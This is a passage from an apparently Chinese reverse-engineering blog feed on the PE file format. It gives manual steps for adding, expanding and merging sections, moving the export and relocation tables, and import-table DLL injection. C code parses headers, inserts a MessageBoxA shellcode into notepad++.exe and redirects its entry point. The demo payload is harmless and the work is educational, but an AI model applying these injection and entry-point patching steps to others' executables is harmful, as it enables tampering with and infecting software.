src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647141658195.png"></p><h3 id="最终修改"><a href="#最终修改" class="headerlink" title="最终修改"></a>最终修改</h3><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647141708469.png"></p><h2 id="插入代码"><a href="#插入代码" class="headerlink" title="插入代码"></a>插入代码</h2><p>在PointerToRawData插入0x1000字节</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647141776493.png"></p><h2 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h2><p>在PE解析工具可以看到插入的节表</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647141801656.png"></p><h1 id="新增节-节表信息后不够位置"><a href="#新增节-节表信息后不够位置" class="headerlink" title="新增节-节表信息后不够位置"></a>新增节-节表信息后不够位置</h1><p>我们直到DOS和NT头之前有一段垃圾数据，当节表末尾没位置插入80个字节，我们需要将NT头和节表信息前移，这样就可以空出一段无用字节，长度为垃圾数据长度</p><blockquote><p>注意要修改LONG AddressOfNewExeHeader-NT头的位置</p></blockquote><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647142922682.png"></p><p>直接复制到垃圾数据的起始地址</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647142986819.png"></p><p>这就是空出来的节表，后续操作和前面新增节一样，就不赘述了</p><h1 id="扩大节"><a href="#扩大节" class="headerlink" title="扩大节"></a>扩大节</h1><p>当前面两种做法都不能满足，我们采取扩大节的办法，可以在任意节区末尾添加，但是如果不是在最后一个节添加，后面的节表偏移都要修改，所以我们扩大最后一个节</p><p>需要修改的数据</p><p>DWORD SizeOfRawData</p><p>Misc.DWORD VirtualSize</p><p>DWORD SizeOfImage</p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ol><li>将最后一个节的SizeOfRawData和VirtualSize改成N，N = 节内存对齐后的大小 + 要扩大的大小</li><li>修改 SizeOfImage大小=SizeOfImage大小+要扩大的大小</li><li>分配一块新的空间，大小为：节内存对齐增加的大小+要扩大的大小</li></ol><h2 id="修正节表信息-1"><a href="#修正节表信息-1" class="headerlink" title="修正节表信息"></a>修正节表信息</h2><p>这里我们假设扩大0x1000个字节</p><p>要改为Max(DWORD VirtualSize,DWORD SizeOfRawData)内存对齐的大小+我们扩大的大小=16000h</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647147742819.png"></p><h2 id="修正SizeOfImage"><a href="#修正SizeOfImage" class="headerlink" title="修正SizeOfImage"></a>修正SizeOfImage</h2><p>直接加上0x1000即可</p><h2 id="分配空间"><a href="#分配空间" class="headerlink" title="分配空间"></a>分配空间</h2><p>节内存对齐增加的大小=N-DWORD SizeOfRawData，即C00</p><p>在节区尾部增加即可，有时候最后一个节区尾部之后还有别的程序，那么就需要计算最后一个节区的结束地址</p><p>求和得到2B6C00h</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647147968238.png"></p><h2 id="最终"><a href="#最终" class="headerlink" title="最终"></a>最终</h2><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647148042480.png"></p><h1 id="合并节"><a href="#合并节" class="headerlink" title="合并节"></a>合并节</h1><h2 id="修改节表个数"><a href="#修改节表个数" class="headerlink" title="修改节表个数"></a>修改节表个数</h2><p>合并之后节数量-1，这里改为7</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647149630089.png"></p><h2 id="修改节表信息"><a href="#修改节表信息" class="headerlink" title="修改节表信息"></a>修改节表信息</h2><p>要将节进行合并，就需要修改节表信息</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647149670756.png"></p><h3 id="DWORD-SizeOfRawData和DWORD-VirtualSize"><a href="#DWORD-SizeOfRawData和DWORD-VirtualSize" class="headerlink" title="DWORD SizeOfRawData和DWORD VirtualSize"></a>DWORD SizeOfRawData和DWORD VirtualSize</h3><p>将这两个值改为该节的Max(SizeOfRawData,VirtualSize)+下一个节的Max(SizeOfRawData,VirtualSize)</p><p>最后保存即可</p><p>那么剩下的节表信息没用了，我们可以再次新增节</p><h2 id="最终效果-1"><a href="#最终效果-1" class="headerlink" title="最终效果"></a>最终效果</h2><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647150089815.png"></p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647150123108.png"></p><h1 id="移动导出表"><a href="#移动导出表" class="headerlink" title="移动导出表"></a>移动导出表</h1><p> <img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/729aff211907434689134a78e18f2a0b.png" alt="导出表结构"> </p><p>移动前，我们需要先开辟节区，先将后面三个表指向的数据复制到新的节区中，再复制那三个表的信息过去，最后将数据目录指向导出表开始的地方</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647219750918.png" alt="移动前"></p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647220007029.png" alt="移动后"></p><h2 id="定位导出表"><a href="#定位导出表" class="headerlink" title="定位导出表"></a>定位导出表</h2><p>在数据目录找到导出表的RVA</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647228628138.png"></p><p>根据节的RVA和大小确定在哪个表</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647228686574.png"></p><p>计算FOA=Export.RVA-rdata.RVA+rdata. PointerToRawData</p><p>计算得到F2270，跳转，根据Export.Size确定大小</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647228914109.png"></p><h2 id="新增节-1"><a href="#新增节-1" class="headerlink" title="新增节"></a>新增节</h2><p>前面说过，就不细🔒了</p><h2 id="复制数据"><a href="#复制数据" class="headerlink" title="复制数据"></a>复制数据</h2><p>前面四个是DWORD函数地址，DWORD函数名称表，WORD函数序号-这里比较少，就一个函数</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647229009740.png"></p><p>这两个分别是dll名字和函数名称</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647229076116.png"></p><p>直接复制剩下的导出表信息</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647229244730.png"></p><h2 id="修改RVA"><a href="#修改RVA" class="headerlink" title="修改RVA"></a>修改RVA</h2><p>这里我已经改好了，因为该节的RVA-PointOfRawData=1600，所以修改的时候将FOA+1600h=RVA</p><p>要修改的有</p><p><img src="/2022/03/11/PE-%E6%BB%B4%E6%B0%B4%E9%80%86%E5%90%91-%E6%89%8B%E5%8A%A8%E5%AE%9E%E7%8E%B0/1647229408065.png"></p><h2 id="数据目录修改"><a href="#数据目录修改" class="headerlink" title="数据目录修改"></a>数据目录修改</h2><p>将Export.RVA指向我们复制导出表的初始位置</p><h1 id="移动重定位表"><a href="#移动重定位表" class="headerlink" title="移动重定位表"></a>移动重定位表</h1><p>新增节-&gt;复制数据-&gt;数据目录修改重定位表位置</p><h2 id="修改ImageBase"><a href="#修改ImageBase" class="headerlink" title="修改ImageBase"></a>修改ImageBase</h2><p>我们修改ImageBase时，重定位表也需要修改，其他不用改，因为其他节表信息映射到内存中时，都是按照ImageBase进行的</p><p>而重定位表是按照VirtualAddress+小表进行修复的，所以ImageBase修改了，重定位表的VirtualAddress也需要修改</p><p>假如ImageBase+1000，重定位表的VirtualAddress也需要+1000</p><h1 id="导入表注入"><a href="#导入表注入" class="headerlink" title="导入表注入"></a>导入表注入</h1><p>每个DLL对应一个导入表，DLL存放着我们的函数</p><p>导入表后面还有一堆数据，我们不能直接添加，所以要新开辟节区，然后复制原来的导入表之后再在末尾添加导入表</p><h2 id="新增节区"><a href="#新增节区" class="headerlink" title="新增节区"></a>新增节区</h2><h2 id="复制导入表信息"><a href="#复制导入表信息" class="headerlink" title="复制导入表信息"></a>复制导入表信息</h2><p> 拷贝原来的导入表到新节中 </p><h2 id="新增导入表"><a href="#新增导入表" class="headerlink" title="新增导入表"></a>新增导入表</h2><h2 id="新增INT表和IAT表"><a href="#新增INT表和IAT表" class="headerlink" title="新增INT表和IAT表"></a>新增INT表和IAT表</h2><p>至少八字节</p><h2 id="修改Name"><a href="#修改Name" class="headerlink" title="修改Name"></a>修改Name</h2><p> 存储要注入的dll的名称 ，并且将DLL名称的RVA赋值给新增导入表的Name</p><h2 id="创建struct-IMAGE-IMPORT-BY-NAME"><a href="#创建struct-IMAGE-IMPORT-BY-NAME" class="headerlink" title="创建struct _IMAGE_IMPORT_BY_NAME"></a>创建struct _IMAGE_IMPORT_BY_NAME</h2><p>将函数名称赋值给结构体的第二个变量</p><h2 id="修改INT和IAT指向的地址"><a href="#修改INT和IAT指向的地址" class="headerlink" title="修改INT和IAT指向的地址"></a>修改INT和IAT指向的地址</h2><p>将IMAGE_IMPORT_BY_NAME的RVA赋值给INT和IAT的第一项，因为INT和IAT都指向_IMAGE_IMPORT_BY_NAME</p><h2 id="修改数据目录"><a href="#修改数据目录" class="headerlink" title="修改数据目录"></a>修改数据目录</h2><p>指向我们的新增位置， 修改IMAGE_DATA_DIRECTORY结构的VirtualAddress和Size </p>]]></content>
      
      
      
        <tags>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE解析代码实现</title>
      <link href="/2022/03/11/PE%E8%A7%A3%E6%9E%90%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/"/>
      <url>/2022/03/11/PE%E8%A7%A3%E6%9E%90%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="打印PE文件头部和节区信息"><a href="#打印PE文件头部和节区信息" class="headerlink" title="打印PE文件头部和节区信息"></a>打印PE文件头部和节区信息</h1><pre class="language-c" data-language="c"><code class="language-c">#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;malloc.h&gt;#include&lt;Windows.h&gt;//宏定义，方便后续使用//定义变量IMAGE_DOS_HEADER myDOS;LONG elf_new;IMAGE_NT_HEADERS32 myNTheader;IMAGE_OPTIONAL_HEADER32 myOPTIONheader;IMAGE_SECTION_HEADER mysection[100];int NUM_SECTION;int main(){FILE* pfile;pfile = fopen("D:\\new\\Notepadx32\\Notepad++.7.6.1.bin.x32\\Notepad++.7.6.1.bin.x32\\notepad++.exe", "r");//打开文件fseek(pfile, 0, SEEK_SET);//参数说明，将fp指针从文件开头移动到0的位置fread(&amp;myDOS, sizeof(IMAGE_DOS_HEADER), 1, pfile);//表示从fp开始的地方读取一次长度为sizeof(IMAGE_DOS_HEADER)的字节，存储到myDOS中//DOSprintf("==============IMAGE_DOS_HEADER==============\n");printf("DOS头：          %08X\n", myDOS.e_magic);printf("NT头所在位置：   %08X\n", myDOS.e_lfanew);elf_new = myDOS.e_lfanew;//将NT头的偏移存储起来//NT头fseek(pfile, elf_new, SEEK_SET);//注意不是sizeof(elf_new)fread(&amp;myNTheader, sizeof(IMAGE_NT_HEADERS), 1, pfile);printf("==============IMAGE_NT_HEADERS==============\n");//打印PE标志printf("PE标志：         %08X\n", myNTheader.Signature);//打印标准PE头信息printf("==============IMAGE_FILE_HEADERS==============\n");printf("节区数量：       %08X\n", myNTheader.FileHeader.NumberOfSections);NUM_SECTION = myNTheader.FileHeader.NumberOfSections;printf("可选PE头大小：   %08X\n", myNTheader.FileHeader.SizeOfOptionalHeader);//打印ASLR的信息，方便查看和修改printf("ASLR属性：       %08X\n", (myNTheader.FileHeader.Characteristics ) &amp; 1);//打印可选PE头信息printf("==============IMAGE_OPTIONAL_HEADERS==============\n");fseek(pfile, elf_new+sizeof(IMAGE_FILE_HEADER)+sizeof(myNTheader.Signature), SEEK_SET);//因为标准PE头长度为20fread(&amp;myOPTIONheader, sizeof(IMAGE_OPTIONAL_HEADER), 1, pfile);printf("DWORD AddressOfEntryPoint：   %08llX\n", myOPTIONheader.AddressOfEntryPoint);printf("基址：%08X\n", myOPTIONheader.ImageBase);//注意这里的可选PE头类型必须是IMAGE_OPTIONAL_HEADER32printf("文件对齐大小：%08X\n", myOPTIONheader.FileAlignment);printf("内存对齐大小：%08X\n", myOPTIONheader.SectionAlignment);printf("文件头和节表大小：  %08X\n", myOPTIONheader.SizeOfHeaders);printf("内存拉伸大小：%08X\n", myOPTIONheader.SizeOfImage);//打印节表信息，前面我们已经存储了节表数量了printf("==============IMAGE_SECTION_HEADER SectionHeaders==============\n");fseek(pfile, elf_new + sizeof(IMAGE_NT_HEADERS32), SEEK_SET);fread(&amp;mysection, sizeof(IMAGE_SECTION_HEADER) * NUM_SECTION, 1, pfile);for (int i = 0; i &lt; NUM_SECTION; ++i){printf("NAME：        %s\n", mysection[i].Name);printf("DWORD VirtualAddress：        %08X\n", mysection[i].VirtualAddress);printf("DWORD SizeOfRawData：        %08X\n", mysection[i].SizeOfRawData);printf("DWORD PointerToRawData：        %08X\n", mysection[i].PointerToRawData);printf("DWORD VirtualSize：        %08X\n", mysection[i].Misc.VirtualSize);}fclose(pfile);//关闭文件return 0;}</code></pre><h1 id="RVA转FOA"><a href="#RVA转FOA" class="headerlink" title="RVA转FOA"></a>RVA转FOA</h1><pre class="language-c" data-language="c"><code class="language-c">#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;windows.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;/** RVA转FOA的思路* 1、先判断所在节区，设计思路：首先我们必须拿的是内存对齐后的来比较大小，先把RVA-virtualaddress，再和max(MISC,SizeofRawData)按照内存对齐的值作比较* 2、循环判断节区* 3、计算FOA，偏移是一样的，那就是RVA-virtualaddress+节区的PointerOfdata*/IMAGE_NT_HEADERS32 myNTheader;IMAGE_DOS_HEADER myDOS;//因为PE头长度不变，所以我们只需要找到elf_new的内容就可以知道节区的起始地址IMAGE_SECTION_HEADER mysection[10];int NUM_SECTION;//我们还需要知道节区的数量int elf_new;int RVA = 0x20d000;long long MAX(DWORD a, DWORD b){//计算MISC和SizeOFRAWDATA，并返回按照内存对齐后的值if (a &gt; b){return (a%myNTheader.OptionalHeader.SectionAlignment)?((a / myNTheader.OptionalHeader.SectionAlignment)+1) * myNTheader.OptionalHeader.SectionAlignment : ((a / myNTheader.OptionalHeader.SectionAlignment)) * myNTheader.OptionalHeader.SectionAlignment;}elsereturn (b % myNTheader.OptionalHeader.SectionAlignment) ? ((b / myNTheader.OptionalHeader.SectionAlignment) + 1) * myNTheader.OptionalHeader.SectionAlignment : ((b / myNTheader.OptionalHeader.SectionAlignment)) * myNTheader.OptionalHeader.SectionAlignment;;}int main(){FILE* pfile;pfile = fopen("D:\\new\\Notepadx32\\Notepad++.7.6.1.bin.x32\\Notepad++.7.6.1.bin.x32\\notepad++.exe", "r");fseek(pfile,0, SEEK_SET);fread(&amp;myDOS, sizeof(IMAGE_DOS_HEADER), 1, pfile);elf_new = myDOS.e_lfanew;fseek(pfile, elf_new, SEEK_SET);fread(&amp;myNTheader, sizeof(IMAGE_NT_HEADERS32), 1, pfile);NUM_SECTION = myNTheader.FileHeader.NumberOfSections;//得到节区fseek(pfile, elf_new + sizeof(IMAGE_NT_HEADERS32), SEEK_SET);fread(&amp;mysection, sizeof(IMAGE_SECTION_HEADER) * NUM_SECTION, 1, pfile);for (int i = 0; i &lt; NUM_SECTION; ++i){if (RVA - mysection[i].VirtualAddress &lt; MAX(mysection[i].Misc.VirtualSize, mysection[i].SizeOfRawData)){printf("所在节区为：%s\n", mysection[i].Name);printf("FOA为：%08X", RVA - mysection[i].VirtualAddress + mysection[i].PointerToRawData);}}fclose(pfile);return 0;}</code></pre><h1 id="PE插入shellcode"><a href="#PE插入shellcode" class="headerlink" title="PE插入shellcode"></a>PE插入shellcode</h1><pre class="language-c" data-language="c"><code class="language-c">#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;Windows.h&gt;#include&lt;malloc.h&gt;#include&lt;stdlib.h&gt;#define MessageBoxA_ADDR 0x76C20F40//MessageBoxA的地址#define shellcode_len 0x12//定义shellcode的长度//输入路径和输出路径char file_path[] = "D:\\new\\Notepadx32\\Notepad++.7.6.1.bin.x32\\Notepad++.7.6.1.bin.x32\\notepad++.exe";char final_path[] = "D:\\new\\Notepadx32\\Notepad++.7.6.1.bin.x32\\Notepad++.7.6.1.bin.x32\\5.exe";//插入的shellcodeBYTE shellcode[] = {0x6A,0x00,0x6A,0x00,0x6A,0x00,0x6A,0x00,0xE8,0x00,0x00,0x00,0x00,0xE9,0x00,0x00,0x00,0x00};int LoadPE(LPVOID*pFileBuffer)//二级指针存储的是一级指针的地址{FILE* pfile;DWORD FileSize = 0;LPVOID pTempBuffer;pfile = fopen(file_path, "rb");//通过fseek和ftell返回文件长度，fseek将fp指针设置在文件尾，ftell获取当前fp指针的位置与文件首的偏移fseek(pfile, 0, SEEK_END);FileSize = ftell(pfile);//重新设置回开头fseek(pfile, 0, SEEK_SET);//开辟空间，malloc函数返回开辟空间的起始地址pTempBuffer = malloc(FileSize);//将文件中的内容读取到临时Buffer中fread(pTempBuffer, FileSize, 1, pfile);//将分配返回的地址存储到FileBuffer中*pFileBuffer = pTempBuffer;//temp指针指向空pTempBuffer = NULL;fclose(pfile);return FileSize;}int CopyFileBufferToImageBuffer(LPVOID pFileBuffer,LPVOID* pImageBuffer)//pImageBuffer是void类型指针，指向的是读取到内存中的文件内容首地址{//初始化PE结构体指针PIMAGE_DOS_HEADER pDOSHeader = NULL;PIMAGE_NT_HEADERS pNTHeader = NULL;PIMAGE_FILE_HEADER pFileHeader = NULL;PIMAGE_OPTIONAL_HEADER32 pOptionalHeader = NULL;PIMAGE_SECTION_HEADER pSectionHeader = NULL;//初始化tempBufferLPVOID pTempBuffer = NULL;//通过强制转换类型来限制长度,转为Dos头的指针那么得到的就是Dos头的信息pDOSHeader = PIMAGE_DOS_HEADER(pFileBuffer);pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pFileBuffer + pDOSHeader-&gt;e_lfanew);//因为void类型的指针不能直接运算，所以将其转为int整型，再做加减得到其他地址pFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTHeader + 4);pOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionalHeader + pFileHeader-&gt;SizeOfOptionalHeader);//分配ImageBuffer内存pTempBuffer = malloc(pOptionalHeader-&gt;SizeOfImage);//初始化ImageBuffer内存memset(pTempBuffer, 0, pOptionalHeader-&gt;SizeOfImage);//拷贝数据memcpy(pTempBuffer, pDOSHeader, pOptionalHeader-&gt;SizeOfHeaders);//参数说明，目标数据、被使用数据，长度//循环拷贝节表信息PIMAGE_SECTION_HEADER pTempSectionHeader = pSectionHeader;for (int i = 0; i &lt; pFileHeader-&gt;NumberOfSections; i++,pTempSectionHeader++){//因为memcpy只接受void类型的指针，所以要先强制转换memcpy((void*)((DWORD)pTempBuffer + pTempSectionHeader-&gt;VirtualAddress), (void*)((DWORD)pFileBuffer + pTempSectionHeader-&gt;PointerToRawData), pTempSectionHeader-&gt;SizeOfRawData);}//赋值给pImageBuffer*pImageBuffer = pTempBuffer;pTempBuffer = NULL;return pOptionalHeader-&gt;SizeOfImage;}int CopyImageBufferToNewBuffer(LPVOID pImageBuffer,LPVOID* pNewBuffer){//初始化PE结构体指针PIMAGE_DOS_HEADER pDOSHeader = NULL;PIMAGE_NT_HEADERS pNTHeader = NULL;PIMAGE_FILE_HEADER pFileHeader = NULL;PIMAGE_OPTIONAL_HEADER32 pOptionalHeader = NULL;PIMAGE_SECTION_HEADER pSectionHeader = NULL;//初始化TempBufferLPVOID pTempBuffer = NULL;//结构体强制转换pDOSHeader = PIMAGE_DOS_HEADER(pImageBuffer);pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDOSHeader-&gt;e_lfanew);//因为void类型的指针不能直接运算，所以将其转为int整型，再做加减得到其他地址pFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTHeader + 4);pOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionalHeader + pFileHeader-&gt;SizeOfOptionalHeader);//计算NewBuffer大小DWORD new_buffer_size = pOptionalHeader-&gt;SizeOfHeaders;//节表大小计算PIMAGE_SECTION_HEADER pTempSectionHeader = pSectionHeader;//注意这里要使用临时变量，否则循环的时候，结构体指针后移，指向改变for (int i = 0; i &lt; pFileHeader-&gt;NumberOfSections; i++, pTempSectionHeader++){new_buffer_size += pTempSectionHeader-&gt;SizeOfRawData;//printf("%X\n", pSectionHeader-&gt;SizeOfRawData);}printf("%X\n", new_buffer_size);//开辟空间并且设置为0pTempBuffer = malloc(new_buffer_size);memset(pTempBuffer, 0, new_buffer_size);//复制ImageBuffer信息memcpy(pTempBuffer, pDOSHeader, pOptionalHeader-&gt;SizeOfHeaders);//复制节表信息pTempSectionHeader = pSectionHeader;for (int i = 0; i &lt; pFileHeader-&gt;NumberOfSections; i++, ++pTempSectionHeader){//因为memcpy只接受void类型的指针，所以要先强制转换memcpy((PWORD)((DWORD)pTempBuffer + pTempSectionHeader-&gt;PointerToRawData), (PWORD)((DWORD)pImageBuffer + pTempSectionHeader-&gt;VirtualAddress), pTempSectionHeader-&gt;SizeOfRawData);}//赋值给pImageBuffer*pNewBuffer = pTempBuffer;pTempBuffer = NULL;return new_buffer_size;}void newbuffer_write2_exe(PVOID NewFileBuffer, DWORD FileSize, char* FilePath){FILE* fp1 = fopen(FilePath, "wb");if (fp1 != NULL){fwrite(NewFileBuffer, FileSize, 1, fp1);printf("成功存盘");}fclose(fp1);return ;}void ADD_Opcode(LPVOID pImageBuffer, LPVOID* pNewBuffer){//初始化PE结构体指针PIMAGE_DOS_HEADER pDOSHeader = NULL;PIMAGE_NT_HEADERS pNTHeader = NULL;PIMAGE_FILE_HEADER pFileHeader = NULL;PIMAGE_OPTIONAL_HEADER32 pOptionalHeader = NULL;PIMAGE_SECTION_HEADER pSectionHeader = NULL;//通过强制转换类型来限制长度,转为Dos头的指针那么得到的就是Dos头的信息pDOSHeader = PIMAGE_DOS_HEADER(pImageBuffer);pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pImageBuffer + pDOSHeader-&gt;e_lfanew);//因为void类型的指针不能直接运算，所以将其转为int整型，再做加减得到其他地址pFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTHeader + 4);pOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionalHeader + pFileHeader-&gt;SizeOfOptionalHeader);//判断能否插入if (shellcode_len &gt; pSectionHeader-&gt;SizeOfRawData - pSectionHeader-&gt;Misc.VirtualSize){printf("长度不足，无法插入\n");free(pImageBuffer);}//计算空白位置，转为char*指针PBYTE code_begin = (PBYTE)((DWORD)pImageBuffer + pSectionHeader-&gt;VirtualAddress+ pSectionHeader-&gt;Misc.VirtualSize);//插入shellcodememcpy(code_begin, shellcode, shellcode_len);//计算E8地址DWORD callADDr = (MessageBoxA_ADDR - (pOptionalHeader-&gt;ImageBase + pSectionHeader-&gt;VirtualAddress + pSectionHeader-&gt;Misc.VirtualSize + 0xD));//将callADDR插入到E8之后,填充数据*(PDWORD)((DWORD)code_begin + 0x09) = callADDr;//计算jmp地址,跳转的值=真实地址-下一条指令地址DWORD jmpADDr = pOptionalHeader-&gt;ImageBase + pOptionalHeader-&gt;AddressOfEntryPoint - ((DWORD)code_begin + pOptionalHeader-&gt;ImageBase + shellcode_len-(DWORD)pImageBuffer);*(PDWORD)((code_begin + 14)) = jmpADDr;//修改OEPpOptionalHeader-&gt;AddressOfEntryPoint = ((DWORD)code_begin - (DWORD)pImageBuffer);//也可以使用VirtualAddress+VirtualSize//还原为NewBufferDWORD ret2=CopyImageBufferToNewBuffer(pImageBuffer, pNewBuffer);//存盘newbuffer_write2_exe(*pNewBuffer,ret2, final_path);return ;}void operate_pe(){LPVOID pFileBuffer = NULL;//LPVOID相当于void*LPVOID pNewBuffer = NULL;LPVOID pImageBuffer = NULL;//读取文件内容到FileBuffer中dDWORD file_size = LoadPE(&amp;pFileBuffer);//二级指针void**,将存储指针的地址传过去printf("文件长度为：  %08X\n", file_size);//将FileBuffer拉伸为ImageBufferDWORD Image_Size = CopyFileBufferToImageBuffer(pFileBuffer,&amp;pImageBuffer);printf("拉伸后的大小为：  %08X\n",Image_Size);//添加opcodeADD_Opcode(pImageBuffer, &amp;pNewBuffer);//开辟的内存需要free掉free(pFileBuffer);free(pNewBuffer);free(pImageBuffer);return;}int main(){operate_pe();return 0;}</code></pre><h1 id="PE文件新增节"><a href="#PE文件新增节" class="headerlink" title="PE文件新增节"></a>PE文件新增节</h1><pre class="language-c" data-language="c"><code class="language-c">#define _CRT_SECURE_NO_WARNINGS#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;windows.h&gt;#include&lt;stdlib.h&gt;#include&lt;malloc.h&gt;/*思路：1、读取文件信息到buffer中判断节区信息够不够大小，两个节表的大小2、找到节区的最后位置，开辟指定大小的空间3、修改信息-NumberOfSection、SizeOfRawData、VirtualSize（注意要对齐）*/#define New_Buffer_Size 0x1000#define File_Path "D:\\new\\Notepadx32\\Notepad++.7.6.1.bin.x32\\Notepad++.7.6.1.bin.x32\\notepad++.exe"#define Final_Path "D:\\new\\Notepadx32\\Notepad++.7.6.1.bin.x32\\Notepad++.7.6.1.bin.x32\\6++.exe"int Open_File(LPVOID *pFileBuffer){FILE* pfile = NULL;LPVOID TempBuffer = NULL;pfile = fopen(File_Path, "rb");fseek(pfile, 0, SEEK_END);DWORD file_size = ftell(pfile);//设置文件指针到文件头fseek(pfile, 0, SEEK_SET);TempBuffer = malloc(file_size);fread(TempBuffer , file_size, 1, pfile);*pFileBuffer = TempBuffer;TempBuffer = NULL;fclose(pfile);return file_size;}int Add_Section(LPVOID FileBuffer, LPVOID* pNewBuffer,DWORD file_size){//定义结构体指针PIMAGE_DOS_HEADER pDOSHeader = NULL;PIMAGE_NT_HEADERS32 pNTHeader = NULL;PIMAGE_OPTIONAL_HEADER32 pOptionalHeader = NULL;PIMAGE_SECTION_HEADER pSection = NULL;PIMAGE_FILE_HEADER pFileHeader = NULL;PVOID pNewTempBuffer = NULL;DWORD New_File_Size = 0;//新增节New_File_Size = file_size + 0x1000;pNewTempBuffer = (PVOID)malloc(New_File_Size);// 判断开辟空间是否成功if (!pNewTempBuffer){printf("pNewTempBuffer开辟空间失败!\n");return 0;}// 初始化内存memset(pNewTempBuffer, 0, New_File_Size);// 将旧空间的内容copy到新的空间memcpy(pNewTempBuffer, FileBuffer, file_size);//读取信息pDOSHeader = (PIMAGE_DOS_HEADER)(pNewTempBuffer);pNTHeader = (PIMAGE_NT_HEADERS32)((DWORD)pNewTempBuffer + pDOSHeader-&gt;e_lfanew);pFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTHeader + 4);pOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pFileHeader + sizeof(IMAGE_FILE_HEADER));pSection = (PIMAGE_SECTION_HEADER)((DWORD)pOptionalHeader + 